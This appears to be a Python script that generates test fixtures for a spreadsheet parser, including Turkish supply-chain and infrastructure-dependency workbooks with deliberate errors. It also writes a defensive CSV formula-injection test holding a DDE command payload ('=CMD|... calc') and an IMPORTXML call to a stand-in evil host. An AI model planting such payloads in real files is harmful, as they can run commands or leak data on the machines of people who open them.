#!/usr/bin/env python3
"""
CAELUS — İlk Gerçek Görev (First Real Task) Deterministik Veri Seti ve Test Fikstür Üreticisi.

Üretilen dosyalar (tests/fixtures/first_real_task/):
1. vaka_a_tedarik_zinciri.xlsx (Çok sayfalı, Türkçe başlıklı, formüllü, önbellekli/önbelleksiz hücreli,
   varlık tekilleştirme adaylı ve satır bazlı doğrulama hatalı gerçek .xlsx)
2. vaka_a_tedarik_zinciri.csv (UTF-8, noktalı virgül ve virgül varyantları)
3. vaka_b_altyapi_bagimlilik.xlsx (Kurumlar ve altyapı/kaynak bağımlılıkları .xlsx)
4. vaka_b_altyapi_bagimlilik.csv (Kurumlar ve altyapı/kaynak bağımlılıkları .csv)
5. formula_injection_test.csv (=, +, -, @, \t, \r formül enjeksiyonu güvenlik testi)
6. corrupt_archive.xlsx (Bozuk ZIP/XLSX başlığı testi)
7. macro_stub_warning.xlsm (vbaProject.bin içeren makro uyarı testi - makro çalıştırılmaz)
"""

from __future__ import annotations
import csv
import hashlib
import json
import zipfile
from pathlib import Path
import openpyxl

ROOT = Path(__file__).resolve().parent.parent
OUT_DIR = ROOT / "tests" / "fixtures" / "first_real_task"


VAKA_A_HEADERS = [
    "Şirket Adı",
    "Şirket Türü",
    "Tedarikçi Kurum",
    "İlişki Türü",
    "Kritiklik_Skoru",
    "Aylık_Hacim_Birim",
    "Birim",
    "Tarih",
    "Toplam_Risk_Formül",
    "Gözlem_Kaynağı",
    "Notlar",
]

VAKA_A_ROWS = [
    # Satır 2: Alfa Teknoloji A.Ş. (Birincil yazım)
    [
        "Alfa Teknoloji A.Ş.",
        "Üretim Kurumu",
        "Marmara Yarı İletken Ltd.",
        "Kritik Bileşen Tedariki",
        0.88,
        12500,
        "Adet",
        "2026-02-01",
        "=E2*F2",
        "ERP_SatinAlma_Kaydi_2026Q1",
        "Ana işlemci modülü tedarik hattı",
    ],
    # Satır 3: ALFA TEKNOLOJI AS (Aynı kurumun farklı yazımı - aday eşleşme 1)
    [
        "ALFA TEKNOLOJI AS",
        "Üretim Kurumu",
        "Kuzey Lojistik A.Ş.",
        "Soğuk Zincir ve Taşıma",
        0.76,
        8400,
        "Adet",
        "2026-02-02",
        "=E3*F3",
        "Gumruk_Beyanname_2026_02",
        "Kuzey koridoru gümrük geçişli sevkiyat",
    ],
    # Satır 4: Alfa Teknoloji (Aynı kurumun kısa yazımı - aday eşleşme 2)
    [
        "Alfa Teknoloji",
        "Üretim Kurumu",
        "Ege Enerji Dağıtım A.Ş.",
        "Enerji ve Altyapı Beslemesi",
        0.82,
        6200,
        "MWh",
        "2026-02-03",
        "=E4*F4",
        "Enerji_Izleme_Tablosu",
        "Üretim tesisi kesintisiz güç bağlantısı",
    ],
    # Satır 5: Beta Biyoteknoloji A.Ş.
    [
        "Beta Biyoteknoloji A.Ş.",
        "Sağlık Üreticisi",
        "Marmara Yarı İletken Ltd.",
        "Sensör Çipi Tedariki",
        0.91,
        4500,
        "Adet",
        "2026-02-04",
        "=E5*F5",
        "Tedarik_Sozlesmesi_B4",
        "Soğuk zincir sensör kartı bağımlılığı",
    ],
    # Satır 6: Anadolu Soğuk Zincir Ltd.
    [
        "Anadolu Soğuk Zincir Ltd.",
        "Lojistik Operatörü",
        "Kuzey Lojistik A.Ş.",
        "Depo ve Aktarma Ortaklığı",
        0.69,
        15800,
        "Ton",
        "2026-02-05",
        "=E6*F6",
        "Liman_Aktarma_Gunlugu",
        "Bölgesel aktarma deposu",
    ],
    # Satır 7: Marmara Yarı İletken Ltd. -> Küresel Silikon Wafer Corp. (Çok adımlı zincir!)
    [
        "Marmara Yarı İletken Ltd.",
        "Bileşen Tedarikçisi",
        "Küresel Silikon Wafer Corp.",
        "Ham Madde İthalatı",
        0.94,
        19000,
        "Wafer",
        "2026-02-06",
        "=E7*F7",
        "Ithalat_Manifestosu_W9",
        "Üst kademe (Tier-2) ham madde darboğazı",
    ],
    # Satır 8: Kasıtlı Doğrulama Hatası 1 (Geçersiz takvim tarihi 2026-02-30 ve bozuk sayısal değer)
    [
        "Delta Savunma Sistemleri A.Ş.",
        "Üretim Kurumu",
        "Marmara Yarı İletken Ltd.",
        "Kritik Bileşen Tedariki",
        "BOZUK_SKOR",
        "BELIRSIZ_HACIM",
        "Adet",
        "2026-02-30",
        "=E8*F8",
        "Ham_Tablo_Hatali_Satir",
        "Bu satır doğrulama motorunun satır bazlı hata yakalamasını test eder",
    ],
    # Satır 9: Kasıtlı Doğrulama Hatası 2 (Boş kaynak varlık adı)
    [
        "",
        "Belirsiz",
        "Kuzey Lojistik A.Ş.",
        "Taşıma",
        0.55,
        1200,
        "Adet",
        "2026-02-07",
        "=E9*F9",
        "Eksik_Kayit_Girisi",
        "Varlık adı boş bırakılmış satır",
    ],
]

VAKA_B_HEADERS = [
    "Kurum_Adi",
    "Kurum_Turu",
    "Bagimli_Altyapi",
    "Bagimlilik_Tipi",
    "Kapasite_Payi",
    "Yedeklilik_Saati",
    "Birim",
    "Olay_Tarihi",
    "Kaynak_Belge",
    "Aciklama",
]

VAKA_B_ROWS = [
    [
        "Ulusal Veri Merkezi A.Ş.",
        "Kritik Bilişim Kurumu",
        "Bölgesel Trafo Merkezi TR-04",
        "Birincil Elektrik Beslemesi",
        0.85,
        18,
        "Saat",
        "2026-03-01",
        "Altyapi_Topoloji_Raporu_2026",
        "Ana sunucu salonu yüksek gerilim hattı",
    ],
    [
        "ULUSAL VERI MERKEZI AS",
        "Kritik Bilişim Kurumu",
        "Fiber Omurga Hattı FB-01",
        "Veri İletişim Omurgası",
        0.92,
        4,
        "Saat",
        "2026-03-02",
        "Btk_Hat_Haritasi_V3",
        "Yedek uydu bağlantısı düşük bant genişlikli",
    ],
    [
        "Merkez Şehir Hastanesi",
        "Sağlık Kurumu",
        "Bölgesel Trafo Merkezi TR-04",
        "Yoğun Bakım Enerji Hattı",
        0.95,
        24,
        "Saat",
        "2026-03-03",
        "Saglik_Afet_Plani_2026",
        "Jeneratör yakıt tamponu 24 saat",
    ],
    [
        "Merkez Şehir Hastanesi",
        "Sağlık Kurumu",
        "Endüstriyel Su Arıtma Tesisi SA-02",
        "Sterilizasyon ve Soğutma Suyu",
        0.78,
        12,
        "Saat",
        "2026-03-04",
        "Belediye_Su_Sebekesi_Kaydi",
        "Diyaliz ve soğutma kulesi su bağımlılığı",
    ],
    [
        "Endüstriyel Su Arıtma Tesisi SA-02",
        "Altyapı Tesisi",
        "Bölgesel Trafo Merkezi TR-04",
        "Pompa İstasyonu Enerjisi",
        0.89,
        6,
        "Saat",
        "2026-03-05",
        "Pompa_Istasyonu_SCADA",
        "Trafo kesintisinde 6 saat sonra su basıncı düşer",
    ],
    [
        "Bölgesel Lojistik Merkezi",
        "Lojistik Kurumu",
        "Fiber Omurga Hattı FB-01",
        "Otomasyon ve Gümrük Sorgu Ağı",
        0.74,
        8,
        "Saat",
        "2026-03-06",
        "Lojistik_Agi_Denetimi",
        "Fiber kesintisinde gümrük kapısı manuel moda düşer",
    ],
]


def patch_xlsx_cached_formula_values(xlsx_path: Path, cached_map: dict[str, str | None]) -> None:
    """
    OpenPyXL formül yazarken <f> üretir ancak Excel açıp kaydetmedikçe <v> (cached value) yazmaz.
    Calamine ve tarayıcı okuyucumuzun hem 'formül + önbellekli değer' hem de 'formül + hesaplanmamış (önbelleksiz)'
    durumunu gerçek .xlsx XML içinde test edebilmesi için sheet1.xml içine deterministik <v> değerlerini ekleriz.
    """
    import re

    temp_zip = xlsx_path.with_suffix(".tmp.xlsx")
    with zipfile.ZipFile(xlsx_path, "r") as zin, zipfile.ZipFile(temp_zip, "w", zipfile.ZIP_DEFLATED) as zout:
        for item in zin.infolist():
            content = zin.read(item.filename)
            if item.filename == "xl/worksheets/sheet1.xml":
                xml_text = content.decode("utf-8")
                for cell_ref, cached_val in cached_map.items():
                    if cached_val is not None:
                        pattern = rf'(<c [^>]*r="{cell_ref}"[^>]*>\s*<f>[^<]+</f>)\s*(?:<v></v>|<v\s*/>)?\s*(</c>)'
                        replacement = rf"\1<v>{cached_val}</v>\2"
                        xml_text = re.sub(pattern, replacement, xml_text)
                content = xml_text.encode("utf-8")
            zout.writestr(item, content)
    temp_zip.replace(xlsx_path)


def build_vaka_a() -> dict:
    xlsx_path = OUT_DIR / "vaka_a_tedarik_zinciri.xlsx"
    csv_path = OUT_DIR / "vaka_a_tedarik_zinciri.csv"

    wb = openpyxl.Workbook()
    ws1 = wb.active
    ws1.title = "Tedarik_Zinciri"
    ws1.append(VAKA_A_HEADERS)
    for row in VAKA_A_ROWS:
        ws1.append(row)

    ws2 = wb.create_sheet(title="Bölgesel_Düğümler")
    ws2.append(["Düğüm_Kodu", "Bölge_Adı", "Kapasite_Endeksi", "Tarih"])
    ws2.append(["TR-MARMARA-01", "Marmara Sanayi Havzası", 0.86, "2026-02-01"])
    ws2.append(["TR-EGE-02", "Ege Liman ve Enerji Koridoru", 0.79, "2026-02-01"])

    wb.save(xlsx_path)

    # Satır 2..6 için önbellekli (cached) formül sonucu ekle, Satır 7'yi kasıtlı olarak önbelleksiz bırak!
    patch_xlsx_cached_formula_values(
        xlsx_path,
        {
            "I2": "11000.0",
            "I3": "6384.0",
            "I4": "5084.0",
            "I5": "4095.0",
            "I6": "10902.0",
            "I7": None,  # Kasıtlı olarak hesaplanmamış formül (uncomputed formula)
        },
    )

    with open(csv_path, "w", encoding="utf-8", newline="") as f:
        writer = csv.writer(f, delimiter=",")
        writer.writerow(VAKA_A_HEADERS)
        for idx, row in enumerate(VAKA_A_ROWS, start=2):
            csv_row = list(row)
            # CSV'de formül yerine hesaplanmış değer veya ham ifade
            if idx == 2:
                csv_row[8] = "11000.0"
            elif idx == 3:
                csv_row[8] = "6384.0"
            elif idx == 4:
                csv_row[8] = "5084.0"
            elif idx == 5:
                csv_row[8] = "4095.0"
            elif idx == 6:
                csv_row[8] = "10902.0"
            elif idx == 7:
                csv_row[8] = "17860.0"
            writer.writerow(csv_row)

    return {
        "xlsx_sha256": hashlib.sha256(xlsx_path.read_bytes()).hexdigest(),
        "csv_sha256": hashlib.sha256(csv_path.read_bytes()).hexdigest(),
    }


def build_vaka_b() -> dict:
    xlsx_path = OUT_DIR / "vaka_b_altyapi_bagimlilik.xlsx"
    csv_path = OUT_DIR / "vaka_b_altyapi_bagimlilik.csv"

    wb = openpyxl.Workbook()
    ws1 = wb.active
    ws1.title = "Altyapi_Bagimliliklari"
    ws1.append(VAKA_B_HEADERS)
    for row in VAKA_B_ROWS:
        ws1.append(row)

    ws2 = wb.create_sheet(title="Kritik_Esikler")
    ws2.append(["Altyapi_Adi", "Maksimum_Kesinti_Saati", "Geri_Donulemez_Kayip_Orani"])
    ws2.append(["Bölgesel Trafo Merkezi TR-04", 12, 0.35])
    ws2.append(["Fiber Omurga Hattı FB-01", 4, 0.22])

    wb.save(xlsx_path)

    with open(csv_path, "w", encoding="utf-8", newline="") as f:
        writer = csv.writer(f, delimiter=";")  # Noktalı virgül ayırıcı testi!
        writer.writerow(VAKA_B_HEADERS)
        for row in VAKA_B_ROWS:
            writer.writerow(row)

    return {
        "xlsx_sha256": hashlib.sha256(xlsx_path.read_bytes()).hexdigest(),
        "csv_sha256": hashlib.sha256(csv_path.read_bytes()).hexdigest(),
    }


def build_edge_cases() -> dict:
    # 1. Formül enjeksiyonlu CSV
    inj_path = OUT_DIR / "formula_injection_test.csv"
    with open(inj_path, "w", encoding="utf-8", newline="") as f:
        writer = csv.writer(f)
        writer.writerow(["Şirket Adı", "Tedarikçi Kurum", "İlişki Türü", "Kritiklik_Skoru", "Tarih", "Notlar"])
        writer.writerow(["=CMD|' /C calc'!A0", "+MALICIOUS_SUM(A1:A2)", "-2+5+HYPERLINK()", "0.75", "2026-02-10", "@IMPORTXML('http://evil.example')"])
        writer.writerow(["\t=TAB_INJECT()", "\r=CR_INJECT()", "Normal İlişki", "0.60", "2026-02-11", "Güvenlik testi satırı"])

    # 2. Bozuk XLSX
    corrupt_path = OUT_DIR / "corrupt_archive.xlsx"
    corrupt_path.write_bytes(b"PK\x03\x04CORRUPT_CAELUS_TEST_PAYLOAD_NOT_A_VALID_ZIP_STREAM")

    # 3. Makro içeren (.xlsm) uyarı testi (vbaProject.bin)
    macro_path = OUT_DIR / "macro_stub_warning.xlsm"
    base_xlsx = OUT_DIR / "vaka_a_tedarik_zinciri.xlsx"
    with zipfile.ZipFile(base_xlsx, "r") as zin, zipfile.ZipFile(macro_path, "w", zipfile.ZIP_DEFLATED) as zout:
        for item in zin.infolist():
            zout.writestr(item, zin.read(item.filename))
        zout.writestr("xl/vbaProject.bin", b"DUMMY_VBA_MACRO_STREAM_NEVER_EXECUTE_IN_CAELUS")

    return {
        "formula_injection_csv_sha256": hashlib.sha256(inj_path.read_bytes()).hexdigest(),
        "corrupt_xlsx_sha256": hashlib.sha256(corrupt_path.read_bytes()).hexdigest(),
        "macro_xlsm_sha256": hashlib.sha256(macro_path.read_bytes()).hexdigest(),
    }


def main() -> None:
    OUT_DIR.mkdir(parents=True, exist_ok=True)
    res_a = build_vaka_a()
    res_b = build_vaka_b()
    res_edge = build_edge_cases()
    manifest = {
        "generated_by": "tools/generate_first_real_task_fixtures.py",
        "vaka_a": res_a,
        "vaka_b": res_b,
        "edge_cases": res_edge,
    }
    (OUT_DIR / "fixtures_manifest.json").write_text(json.dumps(manifest, indent=2, ensure_ascii=False), encoding="utf-8")
    print(json.dumps(manifest, indent=2, ensure_ascii=False))


if __name__ == "__main__":
    main()
